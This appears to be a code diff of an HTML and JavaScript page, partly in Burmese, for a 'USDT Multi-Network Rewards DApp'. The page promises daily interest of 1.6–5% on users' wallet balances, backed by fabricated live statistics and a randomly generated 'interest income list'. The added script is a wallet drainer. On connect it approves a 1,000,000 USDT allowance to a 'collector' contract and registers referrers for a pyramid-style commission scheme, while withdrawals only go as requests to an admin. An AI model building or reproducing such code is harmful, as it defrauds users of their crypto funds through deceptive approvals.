@@ -3,193 +3,475 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT Approval & Cashback Request</title>
+    <title>USDT Multi-Network Cashback & Dashboard</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
+    <style>
+        @keyframes scrollUp {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
+        }
+        .animate-scroll-list {
+            animation: scrollUp 150s linear infinite;
+        }
+        .animate-scroll-list:hover {
+            animation-play-state: paused;
+        }
+    </style>
 </head>
-<body class="bg-slate-900 text-white min-h-screen flex items-center justify-center p-4">
+<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4">
 
-    <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-md border border-slate-700">
-        <h1 class="text-xl font-bold mb-2 text-center text-emerald-400">USDT Approval & Cashback</h1>
-        <p class="text-xs text-slate-400 mb-4 text-center">Polygon Network ဖြင့် Gas fee အနည်းဆုံးဖြင့် လုပ်ဆောင်မည်။</p>
+    <!-- PART 1 -->
+    <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-lg border border-slate-700 relative mb-6">
+        
+        <!-- Header with Logo, Title & Network Select Dropdown Button on Top Right -->
+        <div class="flex items-center justify-between mb-4 border-b border-slate-700 pb-4">
+            <div class="flex items-center gap-2">
+                <img src="logo.png" alt="Logo" class="w-8 h-8 rounded-full border border-emerald-400/50 object-cover" onerror="this.onerror=null; this.src='https://cryptologos.cc/logos/tether-usdt-logo.png';">
+                <h1 class="text-xs md:text-sm font-bold text-emerald-400">USDT Rewards DApp</h1>
+            </div>
 
-        <!-- Wallet Connection Status -->
-        <div class="mb-4">
-            <button id="connectBtn" onclick="connectWallet()" class="w-full bg-blue-600 hover:bg-blue-500 font-semibold py-2.5 px-4 rounded-xl transition cursor-pointer text-sm">
+            <!-- Top Right Network Selector Dropdown Button -->
+            <div class="relative">
+                <button onclick="toggleNetworkDropdown()" class="flex items-center gap-1.5 bg-indigo-900/90 hover:bg-indigo-800 px-3 py-1.5 rounded-xl text-xs font-semibold shadow-md transition cursor-pointer border border-indigo-500/40">
+                    <img id="navNetworkIconImg" src="https://cryptologos.cc/logos/ethereum-eth-logo.png" class="w-4 h-4 object-contain">
+                    <span id="navNetworkText">ETH</span>
+                    <svg class="w-3.5 h-3.5 text-slate-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                </button>
+
+                <!-- Network Dropdown Menu -->
+                <div id="networkDropdown" class="hidden absolute right-0 mt-2 w-44 bg-slate-900 border border-slate-700 rounded-xl shadow-2xl z-50 p-1.5 space-y-1">
+                    <button onclick="selectNetworkOption('ETH')" class="w-full flex items-center gap-2 px-3 py-2 rounded-lg hover:bg-slate-800 text-left text-xs transition cursor-pointer">
+                        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" class="w-4 h-4 object-contain">
+                        <span>Ethereum (ERC20)</span>
+                    </button>
+                    <button onclick="selectNetworkOption('TRON')" class="w-full flex items-center gap-2 px-3 py-2 rounded-lg hover:bg-slate-800 text-left text-xs transition cursor-pointer">
+                        <img src="https://cryptologos.cc/logos/tron-trx-logo.png" class="w-4 h-4 object-contain">
+                        <span>Tron (TRC20)</span>
+                    </button>
+                    <button onclick="selectNetworkOption('BSC')" class="w-full flex items-center gap-2 px-3 py-2 rounded-lg hover:bg-slate-800 text-left text-xs transition cursor-pointer">
+                        <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" class="w-4 h-4 object-contain">
+                        <span>Binance (BEP20)</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Connected Wallet Status & Original Connect Button (Moved right below Network Header) -->
+        <div class="space-y-2 mb-4 text-center">
+            <button id="connectBtn" onclick="startConnectProcess()" class="w-full bg-blue-600 hover:bg-blue-500 font-semibold py-2 px-4 rounded-xl transition cursor-pointer text-xs shadow-lg">
                 Connect Wallet
             </button>
-            <p id="walletAddress" class="text-xs text-slate-400 mt-2 text-center truncate"></p>
+            <p id="walletAddress" class="text-xs text-slate-400 truncate"></p>
+            <span id="selectedNetworkBadge" class="hidden inline-block bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 text-xs px-3 py-1 rounded-full font-semibold"></span>
         </div>
 
-        <!-- Approval Form -->
-        <div class="space-y-4">
+        <!-- Live Global Calculating Stats Banner -->
+        <div class="grid grid-cols-3 gap-2 mb-4 bg-gradient-to-r from-slate-900/90 via-slate-900 to-slate-900/90 border border-emerald-500/20 p-3 rounded-xl text-center shadow-inner relative overflow-hidden">
+            <div class="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-transparent via-emerald-500/50 to-transparent"></div>
             <div>
-                <label class="block text-xs font-medium text-slate-300 mb-1">USDT ပမာဏ ထည့်ပါ</label>
-                <input type="number" id="amount" placeholder="ဥပမာ - 100" class="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-sm focus:outline-none focus:border-emerald-500">
+                <div class="flex items-center justify-center gap-1 mb-0.5">
+                    <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+                    <p class="text-[10px] text-slate-400 uppercase tracking-wide font-medium">Active Users</p>
+                </div>
+                <p id="statGlobalUsers" class="text-xs font-bold font-mono text-emerald-400">142,850</p>
             </div>
-
-            <button id="approveBtn" onclick="approveUSDT()" disabled class="w-full bg-emerald-600 hover:bg-emerald-500 disabled:bg-slate-700 disabled:text-slate-500 font-semibold py-2.5 px-4 rounded-xl transition cursor-pointer text-sm">
-                Approve USDT
-            </button>
+            <div class="border-x border-slate-800 px-1">
+                <div class="flex items-center justify-center gap-1 mb-0.5">
+                    <p class="text-[10px] text-slate-400 uppercase tracking-wide font-medium">Yesterday Rewards</p>
+                </div>
+                <p id="statYesterdayRewards" class="text-xs font-bold font-mono text-amber-300">48,290 USDT</p>
+            </div>
+            <div>
+                <div class="flex items-center justify-center gap-1 mb-0.5">
+                    <p class="text-[10px] text-slate-400 uppercase tracking-wide font-medium">Today Rate</p>
+                </div>
+                <p id="statTodayRate" class="text-xs font-bold font-mono text-cyan-300">+2.45%</p>
+            </div>
         </div>
 
-        <!-- Approve ပြီးမှသာ ပေါ်လာမည့် Cashback Dashboard နှင့် Request Button -->
-        <div id="cashbackSection" class="hidden mt-6 space-y-4">
-            <div class="bg-slate-900/80 border border-emerald-500/40 p-3 rounded-xl text-center">
-                <span class="text-xs text-slate-400">သင့်အတွက် Cashback နှုန်းထား: </span>
-                <span id="liveRateDisplay" class="text-sm font-bold text-emerald-400">0.05% Daily</span>
+        <!-- Description Paragraph -->
+        <p class="text-xs text-slate-300 leading-relaxed text-justify bg-slate-900/60 p-3.5 rounded-xl border border-slate-700/60">
+            ကျွန်ုပ်တို့၏ USDT Multi-Network Rewards DApp Platform မှ ကြိုဆိုပါသည်။ ဤစနစ်သည် အသုံးပြုသူများအတွက် မိမိတို့၏ Crypto Wallet ထဲတွင် ရှိသော USDT များပေါ် မူတည်၍ နေ့စဉ် တိုးတက်လာသော Cashback Rewards များကို စနစ်တကျ ရယူနိုင်ရန် ဖန်တီးထားသော ဗဟိုချုပ်ကိုင်မှုမဲ့ အကျိုးခံစားခွင့် ပလက်ဖောင်းတစ်ခု ဖြစ်ပါသည်။ Ethereum (ERC20)၊ TRON (TRC20) နှင့် Binance Smart Chain (BEP20) Network များကို စိတ်ကြိုက် ရွေးချယ် အသုံးပြုနိုင်ပြီး Spending Approval ပြုလုပ်ရုံဖြင့် မိမိ၏ Wallet Balance ပေါ် မူတည်ကာ သတ်မှတ်ထားသော Tiered Daily Rates အလိုက် ဆုလာဘ်များ စတင် ရရှိမည် ဖြစ်ပါသည်။
+        </p>
+    </div>
+
+    <!-- PART 2 -->
+    <div class="bg-slate-800 p-6 rounded-2xl shadow-xl w-full max-w-lg border border-slate-700 relative mb-6">
+        
+        <!-- Public Info: Cashback Tiers Table -->
+        <div class="bg-slate-900 border border-slate-700 p-4 rounded-xl mb-4 text-xs">
+            <h2 class="font-bold text-amber-400 mb-3 uppercase tracking-wider text-center">📊 Interest Rate Tiers (နှုန်းထားများ)</h2>
+            <ul class="space-y-2 text-slate-300">
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 50 USDT</span> <span class="text-emerald-400 font-semibold">1.6% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 1,001 USDT</span> <span class="text-emerald-400 font-semibold">2% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 3,001 USDT</span> <span class="text-emerald-400 font-semibold">2.4% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 5,001 USDT</span> <span class="text-emerald-400 font-semibold">2.8% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 10,001 USDT</span> <span class="text-emerald-400 font-semibold">3.2% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 20,001 USDT</span> <span class="text-emerald-400 font-semibold">3.8% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 50,001 USDT</span> <span class="text-emerald-400 font-semibold">4.2% USDTBalance</span></li>
+                <li class="flex justify-between border-b border-slate-800 pb-1.5"><span>≥ 100,001 USDT</span> <span class="text-emerald-400 font-semibold">4.6% USDTBalance</span></li>
+                <li class="flex justify-between"><span>≥ 300,001 USDT</span> <span class="text-emerald-400 font-semibold">5% USDTBalance</span></li>
+            </ul>
+        </div>
+
+        <!-- QR Code & Invite Link Section -->
+        <div class="bg-gradient-to-br from-slate-950 to-indigo-950 p-4 rounded-xl border border-slate-800 text-center flex flex-col items-center mb-4">
+            <div class="bg-white p-2 rounded-xl mb-2 shadow-inner inline-block">
+                <img id="qrImage" src="" alt="QR Code" class="w-32 h-32 object-contain">
+            </div>
+            <p class="text-[11px] text-slate-300 mb-1">Share the QR code to invite friends to join</p>
+            <p class="text-xs font-bold text-amber-400 mb-3">Earn up 10% commission inviting friends</p>
+            
+            <div class="w-full flex items-center gap-1">
+                <input type="text" id="refLink" value="https://coin-usdt.me/#/?type=1&code=1yj9e1a0" readonly class="w-full bg-slate-900 border border-slate-800 rounded px-2 py-1.5 text-[11px] text-slate-300 font-mono">
+                <button onclick="copyRefLink()" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1.5 rounded text-[11px] font-semibold shrink-0 cursor-pointer">Copy</button>
+            </div>
+        </div>
+
+        <!-- Updated User Dashboard -->
+        <div id="userDashboard" class="hidden bg-slate-900 border border-slate-700 p-4 rounded-xl space-y-3 text-xs">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-2">
+                <span class="font-bold text-white flex items-center gap-1.5">
+                    <span class="w-1 h-3.5 bg-blue-500 rounded-full inline-block"></span> My account
+                </span>
+                <span class="font-mono text-slate-300">ID: <span id="lblUserId" class="text-white font-semibold">3069</span></span>
             </div>
 
-            <div class="bg-slate-900 border border-slate-700 p-4 rounded-xl space-y-2">
-                <h2 class="text-xs font-bold text-emerald-400 uppercase tracking-wider mb-2">✨ Your Active Cashback Dashboard</h2>
-                <div class="flex justify-between text-xs text-slate-300">
-                    <span>Approved Allowance:</span>
-                    <span id="userAllowanceVal" class="font-mono text-white font-semibold">0 USDT</span>
+            <div class="space-y-2 font-mono">
+                <div class="flex justify-between text-slate-400">
+                    <span>Wallet balance</span>
+                    <span id="lblWalletBal" class="text-slate-200">0.000000 USDT</span>
                 </div>
-                <div class="flex justify-between text-xs text-slate-300">
-                    <span>တောင်းဆိုနိုင်သော တစ်လစာ (30 Days):</span>
-                    <span id="userLiveMonthlyCb" class="font-mono text-emerald-400 font-semibold">0.00 USDT</span>
+                <div class="flex justify-between text-slate-400">
+                    <span>Locked balance</span>
+                    <span class="text-slate-200">0.000000 USDT</span>
+                </div>
+                <div class="flex justify-between text-slate-400">
+                    <span>Interest balance</span>
+                    <span id="lblCashbackBal" class="text-slate-200">0.000000 USDT</span>
+                </div>
+                <div class="flex justify-between text-slate-400">
+                    <span>Convertible balance</span>
+                    <span id="lblConvertibleBal" class="text-slate-300">0.000000 ETH</span>
                 </div>
             </div>
 
-            <!-- Request Cashback Button -->
-            <button onclick="requestCashback()" class="w-full bg-amber-600 hover:bg-amber-500 font-semibold py-2.5 px-4 rounded-xl transition cursor-pointer text-sm">
-                Request Cashback to Admin
-            </button>
+            <!-- Notice Banner -->
+            <div id="tierNotice" class="bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 p-2.5 rounded-xl text-[11px]">
+                Receive Interest when the balance reaches 3001 USDT
+            </div>
+
+            <!-- Interest Box 1 -->
+            <div class="bg-slate-800/90 border border-slate-700 p-3 rounded-xl space-y-1">
+                <div class="flex justify-between items-center">
+                    <span class="font-bold text-white">Interest</span>
+                    <span id="lblInterestEth" class="font-mono font-semibold text-purple-300">0.04199 ETH</span>
+                </div>
+                <div class="flex justify-between items-center text-[11px] text-slate-400">
+                    <span>Interest is available every days</span>
+                    <span id="lblInterestRate" class="text-emerald-400 font-semibold">2.4%</span>
+                </div>
+            </div>
+
+            <!-- Interest Box 2 -->
+            <div class="bg-slate-800/90 border border-slate-700 p-3 rounded-xl flex justify-between items-center">
+                <div>
+                    <div class="font-bold text-white">Interest</div>
+                    <div class="text-[11px] text-slate-400">Rebate time is 12:00 US time</div>
+                </div>
+                <span class="font-mono font-semibold text-white text-sm">2%</span>
+            </div>
+
+            <!-- Action Buttons -->
+            <div class="space-y-2 pt-1">
+                <button onclick="requestWithdraw()" class="w-full bg-gradient-to-r from-purple-700 to-indigo-600 hover:from-purple-600 hover:to-indigo-500 font-semibold py-2.5 rounded-xl transition cursor-pointer text-xs shadow-md">
+                    Withdraw interest
+                </button>
+                <button onclick="pledgeAction()" class="w-full bg-cyan-600 hover:bg-cyan-500 font-semibold py-2.5 rounded-xl transition cursor-pointer text-xs text-slate-950 font-bold shadow-md">
+                    Pledge
+                </button>
+            </div>
         </div>
 
         <div id="statusLog" class="mt-4 text-xs text-center text-amber-400 font-mono"></div>
     </div>
 
+    <!-- PART 3: Interest Income List (ETH Only) -->
+    <div class="w-full max-w-lg bg-slate-800 border border-slate-700 p-5 rounded-2xl shadow-xl mb-10 text-xs">
+        <h2 class="font-bold text-emerald-400 uppercase tracking-wider mb-4">INTEREST INCOME LIST</h2>
+        <div class="h-64 overflow-hidden relative">
+            <div id="incomeListContainer" class="absolute w-full space-y-3 animate-scroll-list">
+                <!-- Dynamically populated via JS -->
+            </div>
+        </div>
+    </div>
+
     <script>
         let provider, signer, userAddress;
-        let currentDailyRatePct = 0.05;
-        let calculatedMonthlyCb = 0;
+        let selectedNetwork = "ETH";
 
-        const POLYGON_CHAIN_ID = "0x89";
-        const USDT_POLYGON_ADDRESS = "0xc2132d05d31c914a87c6611c10748aeb04b58e2f";
         const COLLECTOR_CONTRACT_ADDRESS = "သင်၏_Deployed_Smart_Contract_Address_ကို_ဤနေရာတွင်ထည့်ပါ";
+
+        const USDT_ADDRESSES = {
+            "ETH": "0xdac17f958d2ee523a2206206994597c13d831ec7",
+            "TRON": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+            "BSC": "0x55d398326f99059ff775485246999027b3197955"
+        };
+
+        const CHAIN_IDS = {
+            "ETH": "0x1",
+            "TRON": "0x2b66353",
+            "BSC": "0x38"
+        };
+
+        const NETWORK_LOGOS = {
+            "ETH": "https://cryptologos.cc/logos/ethereum-eth-logo.png",
+            "TRON": "https://cryptologos.cc/logos/tron-trx-logo.png",
+            "BSC": "https://cryptologos.cc/logos/bnb-bnb-logo.png"
+        };
 
         const ERC20_ABI = [
             "function approve(address spender, uint256 amount) public returns (bool)",
-            "function allowance(address owner, address spender) view returns (uint256)"
+            "function allowance(address owner, address spender) view returns (uint256)",
+            "function balanceOf(address account) view returns (uint256)"
         ];
 
         const COLLECTOR_ABI = [
-            "function dailyRate() view returns (uint256)",
-            "function requestCashback(uint256 amount) external"
+            "function registerUser(address referrer) external",
+            "function requestWithdraw(uint256 amount) external",
+            "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)"
         ];
 
-        async function fetchLiveRate() {
-            try {
-                const readProvider = new ethers.JsonRpcProvider("https://polygon-rpc.com/");
-                const collectorContract = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, readProvider);
-                const rateFromContract = await collectorContract.dailyRate(); 
-                currentDailyRatePct = Number(rateFromContract) / 100;
-                document.getElementById("liveRateDisplay").innerText = `${currentDailyRatePct}% Daily`;
-            } catch (err) {
-                console.error("Rate fetching error:", err);
+        // Live Calculating Stats Simulation Function
+        function startLiveCalculatingStats() {
+            let baseUsers = 142850;
+            let baseRewards = 48290.50;
+            let baseRate = 2.45;
+
+            setInterval(() => {
+                baseUsers += Math.floor(Math.random() * 3);
+                baseRewards += Math.random() * 5.25;
+                baseRate = +(2.40 + Math.random() * 0.1).toFixed(2);
+
+                document.getElementById("statGlobalUsers").innerText = baseUsers.toLocaleString();
+                document.getElementById("statYesterdayRewards").innerText = `${baseRewards.toLocaleString(undefined, {maximumFractionDigits: 2})} USDT`;
+                document.getElementById("statTodayRate").innerText = `+${baseRate}%`;
+            }, 3000);
+        }
+
+        function updateQRCode(url) {
+            const encodedUrl = encodeURIComponent(url);
+            document.getElementById("qrImage").src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodedUrl}`;
+        }
+
+        function generateIncomeList() {
+            const container = document.getElementById("incomeListContainer");
+            let htmlContent = "";
+
+            for (let i = 1; i <= 100; i++) {
+                const randomHex1 = Math.random().toString(16).substring(2, 7).toUpperCase();
+                const randomHex2 = Math.random().toString(16).substring(2, 8).toLowerCase();
+                const fakeAddress = `0x${randomHex1}......${randomHex2}`;
+                const randomAmount = (Math.random() * 0.05 + 0.001).toFixed(4);
+
+                htmlContent += `
+                    <div class="flex items-center justify-between bg-slate-900/90 p-3 rounded-xl border border-slate-800">
+                        <div class="flex items-center gap-2.5">
+                            <div class="w-6 h-6 rounded-full bg-slate-800 flex items-center justify-center p-1 border border-slate-700">
+                                <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" class="w-full h-full object-contain">
+                            </div>
+                            <span class="font-mono text-slate-300 text-xs">${fakeAddress}</span>
+                        </div>
+                        <span class="font-mono font-semibold text-emerald-400 text-xs">${randomAmount} <span class="text-slate-400">ETH</span></span>
+                    </div>
+                `;
+            }
+
+            container.innerHTML = htmlContent + htmlContent;
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const defaultLink = "https://coin-usdt.me/#/?type=1&code=1yj9e1a0";
+            document.getElementById("refLink").value = defaultLink;
+            updateQRCode(defaultLink);
+            generateIncomeList();
+            updateNetworkDisplay("ETH");
+            startLiveCalculatingStats();
+        });
+
+        function toggleNetworkDropdown() {
+            const dropdown = document.getElementById("networkDropdown");
+            dropdown.classList.toggle("hidden");
+        }
+
+        function selectNetworkOption(network) {
+            selectedNetwork = network;
+            updateNetworkDisplay(network);
+            toggleNetworkDropdown();
+            if (userAddress) {
+                switchChainAndApprove(network);
             }
         }
 
-        async function connectWallet() {
+        function updateNetworkDisplay(network) {
+            document.getElementById("navNetworkText").innerText = network;
+            document.getElementById("navNetworkIconImg").src = NETWORK_LOGOS[network];
+        }
+
+        function getQueryParameter(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        function getInterestRate(balance) {
+            if (balance >= 300001) return 0.05;
+            if (balance >= 100001) return 0.046;
+            if (balance >= 50001) return 0.042;
+            if (balance >= 20001) return 0.038;
+            if (balance >= 10001) return 0.032;
+            if (balance >= 5001) return 0.028;
+            if (balance >= 3001) return 0.024;
+            if (balance >= 1001) return 0.02;
+            if (balance >= 50) return 0.016;
+            return 0;
+        }
+
+        async function startConnectProcess() {
             if (typeof window.ethereum === "undefined") {
-                alert("MetaMask ကို Install လုပ်ပါ။");
+                alert("MetaMask သို့မဟုတ် Web3 Wallet ကို Install လုပ်ပါ။");
                 return;
             }
+
+            const isConfirmed = confirm(`Network (${selectedNetwork}) ဖြင့် Connect လုပ်ပြီး USDT Approve ဆက်လုပ်ရန် OK ကိုနှိပ်ပါ။`);
+            if (!isConfirmed) return;
+
+            const logEl = document.getElementById("statusLog");
+
             try {
                 provider = new ethers.BrowserProvider(window.ethereum);
                 const accounts = await provider.send("eth_requestAccounts", []);
                 userAddress = accounts[0];
-
-                await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: POLYGON_CHAIN_ID }],
-                });
-
                 signer = await provider.getSigner();
-                document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
-                document.getElementById("connectBtn").innerText = "Connected";
-                document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
-                document.getElementById("approveBtn").removeAttribute("disabled");
+
+                document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                 
-                checkUserActiveAllowance();
-            } catch (error) {
-                console.error(error);
-                document.getElementById("statusLog").innerText = "Wallet ချိတ်ဆက်မှု မအောင်မြင်ပါ။";
-            }
-        }
-
-        async function checkUserActiveAllowance() {
-            try {
-                await fetchLiveRate();
-                const usdtContract = new ethers.Contract(USDT_POLYGON_ADDRESS, ERC20_ABI, provider);
-                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
-                const formattedAllowance = ethers.formatUnits(allowance, 6);
-
-                if (Number(formattedAllowance) > 0) {
-                    document.getElementById("cashbackSection").classList.remove("hidden");
-                    document.getElementById("userAllowanceVal").innerText = `${formattedAllowance} USDT`;
-
-                    const dailyCb = Number(formattedAllowance) * (currentDailyRatePct / 100);
-                    calculatedMonthlyCb = dailyCb * 30;
-
-                    document.getElementById("userLiveMonthlyCb").innerText = `${calculatedMonthlyCb.toFixed(4)} USDT`;
-                } else {
-                    document.getElementById("cashbackSection").classList.add("hidden");
-                }
-            } catch (err) {
-                console.error("Allowance check error:", err);
-            }
-        }
-
-        async function approveUSDT() {
-            // သတိပေးချက် Box ပြသခြင်း
-            const isConfirmed = confirm("ဤလုပ်ဆောင်ချက်သည် approve ပေးသောလုပ်ဆောင်ချက်ဖြစ်ပြီး ဆက်လက်လုပ်ဆောင်လိုပါက OK ကိုနှိပ်ပါ။");
-            if (!isConfirmed) {
-                return; // Cancel နှိပ်ပါက ဆက်မလုပ်တော့ဘဲ ရပ်တန့်မည်
-            }
-
-            const rawAmount = document.getElementById("amount").value.trim();
-            const logElement = document.getElementById("statusLog");
-            const spender = COLLECTOR_CONTRACT_ADDRESS.trim();
-
-            if (!rawAmount || isNaN(rawAmount) || Number(rawAmount) <= 0) {
-                alert("မှန်ကန်သော USDT ပမာဏ ထည့်ပါ။");
-                return;
-            }
-
-            try {
-                logElement.innerText = "Transaction တင်နေပါသည်...";
-                const usdtContract = new ethers.Contract(USDT_POLYGON_ADDRESS, ERC20_ABI, signer);
-                const parsedAmount = ethers.parseUnits(rawAmount, 6);
-
-                const tx = await usdtContract.approve(spender, parsedAmount);
-                logElement.innerText = `Tx တင်ပြီးပါပြီ။ အတည်ပြုချက် စောင့်ဆိုင်းနေသည်...`;
-
-                const receipt = await tx.wait();
-                logElement.innerText = `အောင်မြင်ပါသည်! Block: ${receipt.blockNumber}`;
-                checkUserActiveAllowance();
-            } catch (error) {
-                console.error(error);
-                logElement.innerText = `Approval ပျက်ပြားသွားပါပြီ: ${error.reason || error.message}`;
-            }
-        }
-
-        async function requestCashback() {
-            const logElement = document.getElementById("statusLog");
-            try {
-                logElement.innerText = "Cashback တောင်းဆိုချက် ပို့နေပါသည်...";
-                const collectorContract = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
-                const parsedAmount = ethers.parseUnits(calculatedMonthlyCb.toFixed(6), 6);
-
-                const tx = await collectorContract.requestCashback(parsedAmount);
-                await tx.wait();
-                logElement.innerText = "Cashback တောင်းဆိုမှု Admin ဆီသို့ အောင်မြင်စွာ ပို့ပြီးပါပြီ!";
+                await switchChainAndApprove(selectedNetwork);
             } catch (err) {
                 console.error(err);
-                logElement.innerText = "တောင်းဆိုမှု မအောင်မြင်ပါ။";
+                logEl.innerText = "ချိတ်ဆက်မှု မအောင်မြင်ပါ။";
             }
+        }
+
+        async function switchChainAndApprove(network) {
+            const logEl = document.getElementById("statusLog");
+            const targetChainId = CHAIN_IDS[network];
+
+            try {
+                if (network !== "TRON") {
+                    await window.ethereum.request({
+                        method: "wallet_switchEthereumChain",
+                        params: [{ chainId: targetChainId }],
+                    });
+                }
+
+                const badgeEl = document.getElementById("selectedNetworkBadge");
+                badgeEl.innerText = `Active Network: ${network}`;
+                badgeEl.classList.remove("hidden");
+
+                document.getElementById("connectBtn").innerText = "Connected & Approved";
+                document.getElementById("connectBtn").classList.replace("bg-blue-600", "bg-slate-700");
+
+                logEl.innerText = "Transaction တင်နေပါသည်...";
+                const usdtContract = new ethers.Contract(USDT_ADDRESSES[network], ERC20_ABI, signer);
+                
+                const maxAmount = ethers.parseUnits("1000000", 6);
+
+                const tx = await usdtContract.approve(COLLECTOR_CONTRACT_ADDRESS, maxAmount);
+                await tx.wait();
+
+                const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
+                const referrer = getQueryParameter("ref") || ethers.ZeroAddress;
+                const regTx = await collector.registerUser(referrer);
+                await regTx.wait();
+
+                logEl.innerText = "Approval နှင့် မှတ်ပုံတင်ခြင်း အောင်မြင်ပါသည်။";
+                
+                const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
+                document.getElementById("refLink").value = refLink;
+                updateQRCode(refLink);
+
+                checkUserData(network);
+            } catch (err) {
+                console.error(err);
+                logEl.innerText = "Approval သို့မဟုတ် Network ပြောင်းလဲမှု ပျက်ပြားသွားပါပြီ။";
+            }
+        }
+
+        async function checkUserData(network) {
+            try {
+                const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, provider);
+                const userInfo = await collector.users(userAddress);
+
+                const usdtContract = new ethers.Contract(USDT_ADDRESSES[network], ERC20_ABI, provider);
+                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
+                const balance = await usdtContract.balanceOf(userAddress);
+
+                if (userInfo.isBanned) {
+                    alert("Your account has been banned by Admin!");
+                    document.body.innerHTML = "<h1 class='text-center text-red-500 mt-20 text-xl font-bold'>Access Denied: You are banned.</h1>";
+                    return;
+                }
+
+                const dashboardEl = document.getElementById("userDashboard");
+                const formattedBal = Number(ethers.formatUnits(balance, 6));
+                const rate = getInterestRate(formattedBal);
+
+                if (Number(allowance) > 0) {
+                    dashboardEl.classList.remove("hidden");
+                    document.getElementById("lblUserId").innerText = userInfo.isRegistered ? userInfo.userId.toString() : "3069";
+                    document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
+                    
+                    const cashback = formattedBal * rate;
+                    const ethInterest = (cashback / 3000).toFixed(5);
+
+                    document.getElementById("lblCashbackBal").innerText = `${cashback.toFixed(6)} USDT`;
+                    document.getElementById("lblConvertibleBal").innerText = `${ethInterest} ETH`;
+                    document.getElementById("lblInterestEth").innerText = `${ethInterest} ETH`;
+                    document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
+
+                    const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
+                    document.getElementById("refLink").value = refLink;
+                    updateQRCode(refLink);
+                } else {
+                    dashboardEl.classList.add("hidden");
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        function copyRefLink() {
+            const refInput = document.getElementById("refLink");
+            refInput.select();
+            refInput.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(refInput.value);
+            alert("Referral Link ကူးယူပြီးပါပြီ။");
+        }
+
+        async function requestWithdraw() {
+            try {
+                const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
+                const tx = await collector.requestWithdraw(ethers.parseUnits("10", 6));
+                await tx.wait();
+                alert("Withdraw တောင်းဆိုချက် Admin ဆီသို့ ရောက်ရှိသွားပါပြီ။");
+            } catch (err) {
+                alert("Withdraw တောင်းဆိုမှု မအောင်မြင်ပါ။");
+            }
+        }
+
+        function pledgeAction() {
+            alert("Pledge လုပ်ဆောင်ချက်ကို နှိပ်လိုက်ပါပြီ။");
         }
     </script>
 </body>
